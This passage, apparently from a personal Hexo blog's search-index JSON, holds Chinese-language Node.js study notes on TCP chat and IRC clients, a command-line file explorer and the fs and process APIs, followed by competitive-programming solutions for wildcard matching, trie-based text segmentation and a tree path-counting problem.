' joined the room\\033[39m\\r\\n', nickname); &#125; &#125; else &#123; broadcast('\\033[96m &gt; ' + nickname + ':\\033[39m ' + data + '\\r\\n', nickname, true); &#125; data = \"\"; &#125; else &#123; data += chunk; &#125; &#125;) conn.on('close', function () &#123; count--; delete users[nickname]; broadcast('\\033[96m &gt; ' + nickname + ' left the room\\033[39m\\r\\n', nickname); &#125;);&#125;);function broadcast(msg, nickname, exceptMyself = false) &#123; for (var i in users) &#123; if (!exceptMyself || i != nickname) &#123; users[i].write(msg); &#125; &#125;&#125;/** * 监听 */server.listen(3000, function () &#123; console.log('\\033[96m server listening on *:3000\\033[39m');&#125;) 一个IRC(Internet Relay Chat)客户端程序突然发现一个神奇的快捷键–VS CODE ctrl + shift + C，调出cmd 创建模块12345 &#123; \"name\": \"irc-client\", \"description\": \"Our first TCP client\", \"version\": \"0.0.1\"&#125; 理解NET#STREAM API 1net.connect(port, [[, host], callback]); 1234567//e.g.: net.connect(3000, 'localhost', function () &#123; &#125;);/* EQUAL TOvar client = net.connect(3000, 'localhost');client.on(\"connect\", function () &#123; &#125;);//同样可以监听data与close事件*/ 完成123456789var net = require('net');var client = net.connect(6667, 'irc.freenode.net');client.setEncoding('utf-8');client.on('connect', function() &#123; client.write('NICK mynick\\r\\n'); client.write('USER mynick 0 * :realname\\r\\n'); client.write('JOIN #node.js\\r\\n');&#125;);console.log(client);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"5.CLI以及FS API","date":"2020-09-29T11:10:24.000Z","path":"2020/09/29/nodeJs/5. CLI以及FS API 第一个node.js程序 - 命令行程序/","text":"NODE.JS 为什么要记这个笔记？ 在以前的实战项目中，发现自己的忘性很大，经常忘记函数名以及使用方法，所以在这次的node.js学习之路中，想记一点笔记以自用。 记些什么？ 不记基础和起步内容，记一些重要的模块的api函数以及用法，以及一些JavaScript的巧妙用法。 所采用的书籍？ 《了不起的Node JS 将JavaScript进行到底》 补： 此系列与2020年9月初编写，本想使用node搭建一个项目再发布这些文章，奈何写出来自觉没有hexo的主题好看，因此自行删除不是，打算之后把我的项目展示出来以供参考。 CLI以及FS API 第一个node.js程序 - 命令行程序 需求1. 程序在命令行运行，意味着程序要么通过node命令运行，要么直接执行，通过终端提供交互给用户进行输入输出。 2. 启动后需要显示当前目录的列表 3. 选取某个文件后，显示该文件的内容 4. 选择某个目录后，显示该目录下的信息 5. 运行结束后程序退出 步骤 创建模块 决定使用同步/异步fs 流(stream) 实现输入输出 重构 使用fs进行文件交互 完成 开始声明一个自己的项目(package.json) 12345&#123; \"name\": \"file-explorer\", \"version\": \"0.0.1\", \"description\": \"A command-file file explorer!\"&#125; fs模块 引入(fs是模块唯一一个同时提供异步和同步API的模块) 1234var fs = require('fs');fs.readdir(__dirname, function (err, files) &#123; console.log(files); &#125;); 第一份代码(从显示文件/目录到输入操作)123456789101112131415161718192021222324252627282930313233var fs = require('fs');fs.readdir(process.cwd(), function (err, files) &#123; console.log('');//为了输出更加友好，首先输出一个空行 if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n');//\\033[31m 与 \\033[39m 是为了让文本呈现为红色 &#125; console.log(' Select which file or directory you want to see\\n'); //第一种异步流控制模式-串行 function file(i) &#123; var filename = files[i]; fs.stat(__dirname + '/' + filename, function (err, stat) &#123;//fs.stat会给出文件/目录元数据 if (stat.isDirectory()) &#123;//目录与文件的颜色不同 console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; i++; if (i == files.length) &#123;//没有未处理的文件 console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m');//console.log是这个函数的封装，多了个换行符 process.stdin.resume();//等待用户输入 process.stdin.setEncoding('utf8');//设置流编码为utf8 //... &#125; else &#123; file(i); &#125; &#125;); &#125; file(0);&#125;); 重构一下12345678910111213141516171819202122232425262728293031323334353637383940414243var fs = require('fs'), stdin = process.stdin, stdout = process.stdout, files = [], filename; function file(i) &#123; //过多嵌套会使得程序可读性变差，因此分离出函数 filename = files[i]; fs.stat(__dirname + '/' + filename, function(err, stat) &#123; if(stat.isDirectory()) &#123; console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; if(++i == files.length) &#123; //递归结束调用read读取 read(); &#125; else &#123; file(i); &#125; &#125;); &#125; function read() &#123; console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m'); process.stdin.resume(); process.stdin.setEncoding('utf8'); //... &#125; fs.readdir(process.cwd(), function (err, filesArr) &#123; files = filesArr; console.log(''); if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n'); &#125; console.log(' Select which file or directory you want to see\\n'); file(0); &#125;); 处理输入的事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273var fs = require('fs'), stdin = process.stdin, stdout = process.stdout, //书上的教程默认在上一个函数中定义的所有参数可以在下一个函数中自由使用，实际说明不可以 files = [], filename, stats = [];fs.readdir(process.cwd(), function (err, filesArr) &#123; files = filesArr; console.log(''); if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n'); &#125; console.log(' Select which file or directory you want to see\\n'); file(0);&#125;);function file(i) &#123; //过多嵌套会使得程序可读性变差，因此分离出读取函数 filename = files[i]; fs.stat(__dirname + '/' + filename, function (err, stat) &#123; stats[i] = stat; if (stat.isDirectory()) &#123; console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; if (++i == files.length) &#123; read(); &#125; else &#123; file(i); &#125; &#125;);&#125;function read() &#123; console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m'); process.stdin.resume(); process.stdin.setEncoding('utf8'); stdin.on('data', option);//监听data事件(继承了eventEmitter事件)，并且设置监听函数为option&#125;function option(data) &#123; //检查函数，检查是否命中下标 if (!files[Number(data)]) &#123; /** * 1. 这里可以使用files，在其作用域范围内 (fs.readdir函数的回调函数的一部分) * 2. Number(var) 强制转换 */ stdout.write(' \\033[31Enter your choice: \\033[39m'); &#125; else &#123; stdin.pause();//将流暂停(回到默认状态) if (stats[Number(data)].isDirectory()) &#123; fs.readdir(__dirname + '/' + filename, function(err, files) &#123; console.log(''); console.log(' (' + files.length + ' files)'); files.forEach(function (file) &#123; console.log(' - ' + file); &#125;); console.log(''); &#125;) &#125; else &#123; fs.readFile(__dirname + '/' + filename, 'utf8', function (err, data) &#123; console.log(''); console.log('\\033[90m' + data.replace(/(.*)/g, ' $1') + '\\033[39m');//正则表达式添加一些辅助缩进 &#125;); &#125; &#125;&#125; 反思 - CLI的一些常用接口argv process.argv 所有node程序运行时的参数值 1console.log(process.argv);// 除去两个常用参数 =&gt; process.argv.slice(2) 12345[ &apos;C:\\\\Program Files\\\\nodejs\\\\node.exe&apos;, &apos;C:\\\\Users\\\\v25bh\\\\Desktop\\\\node.js\\\\nodejs-note\\\\file-explorer\\\\example.js&apos;, &apos;temp&apos;] 工作目录 1__dirname //执行文件在文件系统中所在的目录 1process.cwd() //获取当前目录 1process.chdir(&apos;/&apos;) //灵活改变目录 环境变量 1process.env //访问shell环境下的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#123; ALLUSERSPROFILE: 'C:\\\\ProgramData', APPDATA: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming', 'asl.log': 'Destination=file', CLASSPATH: '.;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\lib\\\\dt.jar;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\lib\\\\tools.jar;', CommonProgramFiles: 'C:\\\\Program Files\\\\Common Files', 'CommonProgramFiles(x86)': 'C:\\\\Program Files (x86)\\\\Common Files', CommonProgramW6432: 'C:\\\\Program Files\\\\Common Files', COMPUTERNAME: 'LAPTOP-TLHLP7T6', ComSpec: 'C:\\\\WINDOWS\\\\system32\\\\cmd.exe', configsetroot: 'C:\\\\WINDOWS\\\\ConfigSetRoot', DriverData: 'C:\\\\Windows\\\\System32\\\\Drivers\\\\DriverData', FPS_BROWSER_APP_PROFILE_STRING: 'Internet Explorer', FPS_BROWSER_USER_PROFILE_STRING: 'Default', HOMEDRIVE: 'C:', HOMEPATH: '\\\\Users\\\\v25bh', JAVA_HOME: 'C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131', LOCALAPPDATA: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local', LOGONSERVER: '\\\\\\\\LAPTOP-TLHLP7T6', NUMBER_OF_PROCESSORS: '8', OneDrive: 'C:\\\\Users\\\\v25bh\\\\OneDrive', OneDriveConsumer: 'C:\\\\Users\\\\v25bh\\\\OneDrive', OS: 'Windows_NT', Path: 'C:\\\\Program Files (x86)\\\\Common Files\\\\Oracle\\\\Java\\\\javapath;C:\\\\Windows\\\\system32;C:\\\\Windows;C:\\\\Windows\\\\System32\\\\Wbem;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\;C:\\\\Windows\\\\System32\\\\OpenSSH\\\\;C:\\\\Program Files (x86)\\\\NVIDIA Corporation\\\\PhysX\\\\Common;C:\\\\Program Files\\\\NVIDIA Corporation\\\\NVIDIA NvDLISR;D:\\\\Git\\\\cmd;D:\\\\php-7.3.10-Win32-VC15-x64;E:\\\\MaINECRAFT\\\\WorldPainter;D:\\\\php-7.3.10-Win32-VC15-x64\\\\php.exe;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\bin;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\jre\\\\bin;C:\\\\WINDOWS\\\\system32;C:\\\\WINDOWS;C:\\\\WINDOWS\\\\System32\\\\Wbem;C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\;C:\\\\WINDOWS\\\\System32\\\\OpenSSH\\\\;C:\\\\Program Files\\\\MySQL\\\\MySQL Shell 8.0\\\\bin\\\\;C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps;C:\\\\Python27;C:\\\\Python27\\\\Scripts;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\npm;D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;D:\\\\Microsoft VS Code\\\\bin;C:\\\\Program Files\\\\Java\\\\jre1.8.0_221\\\\bin;D:\\\\Vagrant\\\\bin;C:\\\\Program Files\\\\PuTTY\\\\;C:\\\\Program Files\\\\dotnet\\\\;C:\\\\Program Files\\\\Microsoft SQL Server\\\\130\\\\Tools\\\\Binn\\\\;C:\\\\Program Files\\\\Microsoft SQL Server\\\\Client SDK\\\\ODBC\\\\170\\\\Tools\\\\Binn\\\\;C:\\\\Program Files\\\\nodejs\\\\;C:\\\\Program Files\\\\MySQL\\\\MySQL Shell 8.0\\\\bin\\\\;C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps;C:\\\\Python27;C:\\\\Python27\\\\Scripts;D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;;D:\\\\Microsoft VS Code\\\\bin;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\Composer\\\\vendor\\\\bin;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\npm', PATHEXT: '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL', PhpStorm: 'D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;', PROCESSOR_ARCHITECTURE: 'AMD64', PROCESSOR_IDENTIFIER: 'Intel64 Family 6 Model 158 Stepping 10, GenuineIntel', PROCESSOR_LEVEL: '6', PROCESSOR_REVISION: '9e0a', ProgramData: 'C:\\\\ProgramData', ProgramFiles: 'C:\\\\Program Files', 'ProgramFiles(x86)': 'C:\\\\Program Files (x86)', ProgramW6432: 'C:\\\\Program Files', PROMPT: '$P$G', PSModulePath: 'C:\\\\Users\\\\v25bh\\\\Documents\\\\WindowsPowerShell\\\\Modules;C:\\\\Program Files\\\\WindowsPowerShell\\\\Modules;C:\\\\WINDOWS\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\Modules', PUBLIC: 'C:\\\\Users\\\\Public', SESSIONNAME: 'Console', SystemDrive: 'C:', SystemRoot: 'C:\\\\WINDOWS', TEMP: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Temp', TMP: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Temp', USERDOMAIN: 'LAPTOP-TLHLP7T6', USERDOMAIN_ROAMINGPROFILE: 'LAPTOP-TLHLP7T6', USERNAME: 'v25bh', USERPROFILE: 'C:\\\\Users\\\\v25bh', VAGRANT_HOME: 'C:\\\\Users\\\\v25bh\\\\.vagrant.d', VBOX_MSI_INSTALL_PATH: 'D:\\\\vitualbox\\\\', VS110COMNTOOLS: 'D:\\\\visual studio express2012\\\\Common7\\\\Tools\\\\', windir: 'C:\\\\WINDOWS'&#125; 退出 1process.exit(number); //number: 提供一个退出代码 ( 可以接在console.error(str);之后 ) 进程信号 1234process.on(&apos;SIGKILL&apos;, function()&#123; //node程序是通过在process对象上以事件分发的形式发送信号 //e.g: SIGKILL是一个进程终止的信号&#125;) ANSI转义码 在文本终端下控制格式，颜色以及其他输出选项 1放个博客总结(https://blog.csdn.net/vivian_wanjin/article/details/82930308) fs的一些接口 1fs.createReadStream('filepath'); 对比： 123456789101112131415161718var fs = require(&apos;fs&apos;);fs.readFile(&apos;file.txt&apos;, function(err, contents) &#123; //do sth console.log(&apos;readFile(): &apos; + contents);&#125;);//分段之后对大文件(日志 / 视频)的处理能力增强var stream = fs.createReadStream(&apos;file.txt&apos;);var data = &apos;&apos;;stream.on(&apos;data&apos;, function(chunk) &#123; //处理一部分内容，例如: data += chunk; data += chunk; console.log(&quot;chunk&quot;);&#125;)stream.on(&apos;end&apos;, function(chunk) &#123; //文件读取完毕 console.log(data + &quot; 最后一截chunk是空的 &quot; + chunk);&#125;) 1fs.watchFile() //监视文件 123456789101112var fs = require('fs');//fs的同步方法var files = fs.readdirSync(process.cwd());files.forEach( function (file) &#123; //寻找以css为后缀的文件，如果更改就输出文件名 if(/\\.css/.test(file)) &#123; //一直运行的检测方法，如果改动就会触发事件 fs.watchFile(process.cwd() + '/' + file, function() &#123; console.log(' - ' + file + ' changed'); &#125;); &#125;&#125;);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"Question-P2536","date":"2020-03-02T08:52:34.000Z","path":"2020/03/02/questions/Question-P2536/","text":"题目描述科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。 科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！ 每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配符 * 和 ? 来表示。其中 * 的意思是可以匹配上0个或任意多个字符，而 ? 的意思是匹配上任意一个字母。 如果一个RNA片段能够和“病毒模版片段”相匹配，那么这个RNA片段就是未知的病毒。 例如，假设“病毒模版片段”为A*G?C。RNA片段：AGTC，AGTGTC都是未知的病毒，而RNA片段AGTGC则不是病毒。 由于，机器人搜集的这些RNA片段中除去病毒的其他部分都具有非常高的研究价值。所以科学家们希望能够分辨出其中哪些RNA片段不是病毒，并将不是病毒的RNA片段运回宇宙空间站继续进行研究。 科学家将这项任务交给了小联。现在请你为小联编写程序统计哪些RNA片段不是病毒。 输入格式第一行有一个字符串，由A、C、T、G、*、? 组成。表示“病毒模版片段”。“病毒模版片段”的长度不超过1000。第二行有一个整数N（0 &lt; N &lt; 500），表示机器人搜集到的RNA片段的数目。随后的N行，每一行有一个字符串，由A、C、T、G组成，表示一个RNA片段。每个RNA片段的长度不超过500。注意：“病毒模版片段”和RNA片段的长度都至少为1。 输出格式只有一行输出，为整数M，即不是病毒的RNA片段的数目。 输入输出样例输入 #1A*G?C 3 AGTC AGTGTC AGTGC输出 #11说明/提示输入中的RNA片段AGTGC不是病毒。 听歌儿 大爱凉风~ 解看似紫题，实则水题 其实只是因为咱发现了独特的解法 一看数据范围，哇，500 (wushiling wwwww) 这次应该打暴力了 *用于分割字符串，那咱干脆就把字符串分开算了： 建立字符串的一维数组和一个处理数据的临时字符栈，扫描输入的字符串，见到字符就放到栈里，见到*就全部出栈，放到字符串数组下标len的字符串里，然后len++ 当然咱还得处理俩特殊情况： *开头 *连续出现，中间没有字符分割 这俩情况咱if特判一下就好啦 然后就该读入测试数据了： 咱就让每个测试字符串依次通过目标字符串们(目标字符串由*断开)的审核，如果通过了就消掉前面通过的部分，如果没通过就出来，不匹配 同时这种测试可以贪心解决，在同一个测试字符串中对于同一个目标字符串，最先匹配到(这里的先指的是字符顺序优先，咱匹配肯定是按照字符顺序扫描着来的嘛)的必然是最优解(而不是唯一最优解，这里说明) 然后是匹配(每一个目标字符串匹配一次)的问题： 咱可以使用并行来匹配，就像VScode匹配选中的字符一样(没错就是这里给了我灵感) 先过第一个目标字符串的字符，扫描测试字符串里所有的该字符，按优先度(以顺序优先，也同时完成了暗中的贪心必备排序)存上位置 目标字符串里的字符一个一个过，每过一个字符就遍历一遍还在字符串里的字符，判断那个字符的下一个字符是不是这个目标字符串里的字符，是则位置+1，否则踢出数组 最后导致结束的两种情况： 数组空了 目标字符串进行匹配完了 第一种情况则匹配失败，第二种情况则匹配成功，取最前面完成匹配的数组的位置(也就是位置存值最小的地方)，断掉之前的所有元素，继续换下一个目标字符串进行 很完美的解法咯，最后我想到数组可以换成链表就可以解决删除数组元素复杂度太大的问题了，这里就变成了线性复杂度而非平方(ps：可惜写链表老是RE错误，暴力数组却过了所以这里的优化也许是没有必要的哈哈哈哈哈哈) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; using namespace std; int n, dictLen = 0, dictLenSingle[1000], ans = 0; char sAll[1050]; char stmp[505]; char dict[1050][1050]; //根据*来划分目标字符串 void Build() { int len = strlen(sAll), tmpl = 0; for(int i = 0; i &lt; len; i++) { //这俩if就是特判啦 if(i == 0 &amp;&amp; sAll[i] == &apos;*&apos;) continue; if(sAll[i] == &apos;*&apos; &amp;&amp; sAll[i - 1] == &apos;*&apos;) continue; if(sAll[i] != &apos;*&apos;) dict[dictLen][tmpl++] = sAll[i]; else { dictLenSingle[dictLen++] = tmpl; tmpl = 0; } } if(tmpl != 0) { dictLenSingle[dictLen++] = tmpl; tmpl = 0; } } //对应一个测试字符串和目标字符串数组(目标字符串们) int Exam(char tmps[], int k, int st, int ed) { //你瞧这暴力的开空间 int* pos = new int[ed - st + 1]; int posLen = 0, res = ed; for(int i = 0; i &lt; ed - st + 1; i++) pos[i] = 0; for(int i = 0; i &lt; dictLenSingle[k]; i++) { if(i == 0) { for(int j = st; j &lt; ed - dictLenSingle[k] + 1; j++) if(tmps[j] == dict[k][0] || dict[k][0] == &apos;?&apos;) pos[posLen++] = j; continue; } for(int j = 0; j &lt; posLen; j++) if(pos[j] != -1) { if(tmps[pos[j] + 1] == dict[k][i] || dict[k][i] == &apos;?&apos;) pos[j]++; //你瞧这暴力的置空 else pos[j] = -1; } } for(int i = 0; i &lt; posLen; i++) if(pos[i] != -1) //你瞧这暴力的判定 res = res &lt; pos[i] ? res : pos[i]; return res; } bool Judge(char tmps[]) { int st = 0, ed = strlen(tmps); for(int i = 0; i &lt; dictLen; i++) { st = Exam(tmps, i, st, ed); if(st == ed) return false; } return true; } int main() { scanf(&quot;%s&quot;, sAll); Build(); scanf(&quot;%d&quot;, &amp;n); for(int i = 1; i &lt;= n; i++) { scanf(&quot;%s&quot;, stmp); if(!Judge(stmp)) ans++; } printf(&quot;%d&quot;, ans); }时间复杂度分析我用的是数组嘛，但是我把那里的时间复杂度也缩短到了线性,因为我在删除的时候根本没有移位 (就是常数远远大于链表哈哈哈) 前面构建目标数组们： $$ O( N_{目标字符串们的总长} ) (N &lt; 1000) $$ 后面单个个测试字符串的测试时间： $$ O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) ) $$ 俩一加，得到： $$ O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) ) $$$$ = O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{分隔符的个数} * N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) $$$$ = O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{目标字符串们的总长} * N_{第一个目标字符匹配到相等的测试字符的数量} ) $$ 按照随机的原则: $$ N_{第一个目标字符匹配到相等的测试字符的数量} \\approx N_{一个测试字符串长度} / 4 $$ 最后乘上个测试字符串的个数： $$ O( N_{目标字符串们的总长} * N_{一个测试字符串长度} * N_{测试字符串的个数} ) $$ 差不多就是 1000 * 500 * 500，2.5E8是够的，实际的数字比这个小好多(有除以4呢) 如果我们用链表，那么常数就更小更小咯，不过这已经足够了 (为什么我动态链表RE了！QAQ)","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"暴力","slug":"暴力","permalink":"https://v25bh145.github.io/tags/%E6%9A%B4%E5%8A%9B/"}]},{"title":"Question-P2292","date":"2020-02-27T12:44:53.000Z","path":"2020/02/27/questions/Question-P2292/","text":"P2292题目描述标点符号的出现晚于文字的出现，所以以前的语言都是没有标点的。现在你要处理的就是一段没有标点的文章。 一段文章T是由若干小写字母构成。一个单词W也是由若干小写字母构成。一个字典D是若干个单词的集合。我们称一段文章T在某个字典D下是可以被理解的，是指如果文章T可以被分成若干部分，且每一个部分都是字典D中的单词。 例如字典D中包括单词{‘is’, ‘name’, ‘what’, ‘your’}，则文章‘whatisyourname’是在字典D下可以被理解的，因为它可以分成4个单词：‘what’, ‘is’, ‘your’, ‘name’，且每个单词都属于字典D，而文章‘whatisyouname’在字典D下不能被理解，但可以在字典D’=D+{‘you’}下被理解。这段文章的一个前缀‘whatis’，也可以在字典D下被理解，而且是在字典D下能够被理解的最长的前缀。 给定一个字典D，你的程序需要判断若干段文章在字典D下是否能够被理解。并给出其在字典D下能够被理解的最长前缀的位置。 输入格式输入文件第一行是两个正整数n和m，表示字典D中有n个单词，且有m段文章需要被处理。之后的n行每行描述一个单词，再之后的m行每行描述一段文章。 其中1&lt;=n, m&lt;=20，每个单词长度不超过10，每段文章长度不超过1M。 输出格式对于输入的每一段文章，你需要输出这段文章在字典D可以被理解的最长前缀的位置。 输入输出样例输入 #1复制4 3isnamewhatyourwhatisyournamewhatisyounamewhaisyourname 输出 #1复制14 （整段文章’whatisyourname’都能被理解）6 （前缀’whatis’能够被理解）0 （没有任何前缀能够被理解） 听音乐 解一个非常有意思的字符串问题 (这道题有个有趣的灵魂) 从单词和小写来看，这题一定是需要建立字典树的，之后怎么办呢？ 错解我们可以针对字符文本来创一个栈，逐字扫描入栈，如果栈里的字符构成了个单词，就全部请出去继续扫描，如果栈里的字符长于字典树匹配的最长单词，这段文字就不可翻译 但是这样做会出现个问题：目前选择的单词并不是最优解 何来此言？举个例子： 就拿测试数据举例子： 4 3 whatis what your name whatisyourname我们如果单纯进行扫描入栈的操作，会在进行到what这儿判定为一个单词，请出栈，然后i打头莫得单词，直接判定为不可翻译 所以这样的线性算法是行不通的 等等，你刚刚说了最优解对吧？！！ 正解我们需要一个最优选择，使得我们可以完美选择字典的单词来翻译 反转思维来考虑这种问题，已知前面的文段已经被正确翻译，如何来解下面的翻译问题？ 思路1 -dfs我们需要遍历所有这个字符的单词，判定这个字符能达到哪些单词，然后再从这个字符的下一个字符出发，看能达到哪些单词，如果有成功达到终点的单词，就结束 思路2 -动态规划我们可以依次遍历这个文本，如果字符可以达到就遍历这个字符的下个字符开头的所有单词，将能达到的点设为可以达到状态，然后继续扫描 (只要能到达那个地方) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; using namespace std; int root = 0, length = 1, n, m; struct TrieNode { int child[26]; bool isWord; }tree[2200]; inline void Add(string s) //添加单词到字典 { int x = root; for(int i = 0; i &lt; s.length(); i++) { if(tree[x].child[s[i] - &apos;a&apos;] == 0) { length++; tree[x].child[s[i] - &apos;a&apos;] = length; } x = tree[x].child[s[i] - &apos;a&apos;]; } tree[x].isWord = true; } char tmpWord[15], tmpText[1000050]; string tmpS; int maxLen; bool canReach[1000050]; inline void Find(string text) //重头戏来了：动态规划的扫描 { //进行初始化 maxLen = -1; for(int i = 0; i &lt; text.length(); i++) canReach[i] = false; //初始化第一个字符能达到的点 for(int i = 0, x = root; i &lt; text.length(); i++) { if(tree[x].child[text[i] - &apos;a&apos;] == 0) break; x = tree[x].child[text[i] - &apos;a&apos;]; if(tree[x].isWord) canReach[i] = true; } //沿着字符扫描文本 for(int i = 0; i &lt; text.length(); i++) { //走不到就溜 if(!canReach[i]) continue; //走到了就遍历以下一个字符开头能到达的所有点 //放到字典树就是遍历一遍那条边，如果是个单词就设置为可以达到 maxLen = i; for(int j = i + 1, x = root; j &lt; text.length(); j++) { if(tree[x].child[text[j] - &apos;a&apos;] == 0) break; x = tree[x].child[text[j] - &apos;a&apos;]; if(tree[x].isWord) canReach[j] = true; } } } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(int i = 1; i &lt;= n; i++) { scanf(&quot;%s&quot;, tmpWord); tmpS = string(tmpWord); Add(tmpS); } for(int i = 1; i &lt;= m; i++) { scanf(&quot;%s&quot;, tmpText); tmpS = string(tmpText); Find(tmpS); printf(&quot;%d\\n&quot;, maxLen + 1); } }最后动态规划具有最优子结构和无后效性 一开始我居然使用的是dfs，失误失误QAQ (果然我对动态规划还是理解不深呢) (逃)","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"字典树","slug":"字典树","permalink":"https://v25bh145.github.io/tags/%E5%AD%97%E5%85%B8%E6%A0%91/"}]},{"title":"Question-CF979C","date":"2020-02-19T08:10:24.000Z","path":"2020/02/19/questions/Question-CF979C/","text":"CF979C Kuro and Walking Route题目描述Kuro is living in a country called Uberland, consisting of n towns, numbered from 1 to n , and n - 1 bidirectional roads connecting these towns. It is possible to reach each town from any other. Each road connects two towns a and b . Kuro loves walking and he is planning to take a walking marathon, in which he will choose a pair of towns (u, v) (u != v)​ and walk from uu using the shortest path to v (note that (u, v) is considered to be different from (v, u) . Oddly, there are 2 special towns in Uberland named Flowrisa (denoted with the index x ) and Beetopia (denoted with the index y ). Flowrisa is a town where there are many strong-scent flowers, and Beetopia is another town where many bees live. In particular, Kuro will avoid any pair of towns (u, v) if on the path from u to v , he reaches Beetopia after he reached Flowrisa, since the bees will be attracted with the flower smell on Kuro’s body and sting him. Kuro wants to know how many pair of city (u, v) he can take as his route. Since he’s not really bright, he asked you to help him with this problem. 输入格式The first line contains three integers n ($1 &lt;= n &lt;= 3 * 10 ^ {5}$) , x and y ($1 &lt;= x,y &lt;= n$)- the number of towns, index of the town Flowrisa and index of the town Beetopia, respectively. n - 1lines follow, each line contains two integers a and b​, describes a road connecting two towns a and b . It is guaranteed that from each town, we can reach every other town in the city using the given roads. That is, the given map of towns and roads is a tree. 输出格式A single integer resembles the number of pair of towns (u, v) that Kuro can use as his walking route. 题意翻译n 个结点，编号从 1 到 n ， n−1 条双向边的连通图，问图中有多少点对 (u,v) 使得从 u 到 v 的最短路上，不存在先到达 x ，再到达 y 的情况。点对 (u,v) 与点对 (v,u) 被认为是不同的。 听歌 解分析n个节点，n - 1条边，每一个节点都有边与之相连，可以判断出来是一棵树 我们可以利用容斥把题的意思翻转一下，点之间的最短路径总数(n * n - n) = 先到x再到y的情况 + 不是先到x再到y的情况因此题意就变成了 求两点之间的最短路径中，先到x再到y的情况 模拟我们先画一个简单的树出来 设起始点是3，终点是5，3到5的最短路径是 3 -&gt; 4 -&gt; 5 我们可以由起点和终点把树划分为三个点集 第一个集包含了由起点到终点的最短路径中所经过的点(不包含起始和终点)第二个集包含了起点，集合内的点互相联通且与第一个集的交集为空第三个集包含了终点，集合内的点互相联通且与第一个集的交集为空 举个例子，图中第一个集合就是4，第二个集合就是1, 2, 3，第三个集合就是5, 6, 7 可以看出来，先到x再到y的最短路径的总和 = 第二个集合的基数 * 第三个集合的基数 算法思路这就好做多了，我们可以两边dfs分别求集合。 这里我们依然采用容斥 第一次dfs 我们可算出第一个集合与第二个集合的基数之和(从起点dfs，终止条件是 vis1[n] 或 n == ed) 第二次dfs 